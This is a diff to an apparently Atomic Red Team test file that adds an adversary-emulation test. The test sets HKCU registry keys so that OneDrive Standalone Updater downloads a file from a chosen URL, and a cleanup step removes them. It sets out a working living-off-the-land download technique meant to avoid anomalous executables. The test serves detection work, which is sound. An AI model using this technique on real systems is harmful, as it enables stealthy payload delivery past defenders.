@@ -1223,3 +1223,48 @@ atomic_tests:
     name: powershell
     command: |
       sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
+- name: Download a file with OneDrive Standalone Updater
+  description: |
+    Uses OneDrive Standalone Updater to download a file from a specified URL by setting up the required registry keys.
+    This technique can be used to download files without executing anomalous executables.
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_url:
+      description: URL to download file from
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    onedrive_path:
+      description: Path to OneDrive Standalone Updater executable
+      type: path
+      default: 'C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      OneDriveStandaloneUpdater.exe must exist on disk at specified location
+    prereq_command: |
+      if (Test-Path "#{onedrive_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Please install OneDrive or specify correct path."
+  executor:
+    command: |
+      if (-not (Test-Path "#{onedrive_path}")) {
+          Write-Host "OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Test cannot continue."
+          exit 1
+      }
+
+      New-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force | Out-Null
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateRingSettingURLFromOC" -Value "#{remote_url}" -Type String -Force
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "ODSUUpdateXMLUrlFromOC" -Value "#{remote_url}" -Type String -Force
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateXMLUrlFromOC" -Value "#{remote_url}" -Type String -Force
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateOfficeConfigTimestamp" -Value 99999999999 -Type QWord -Force
+      
+      # Run OneDrive Standalone Updater
+      & "#{onedrive_path}"
+    cleanup_command: |
+      Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force -ErrorAction Ignore
+      Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json" -Force -ErrorAction Ignore
+
+    name: powershell
+    elevation_required: false
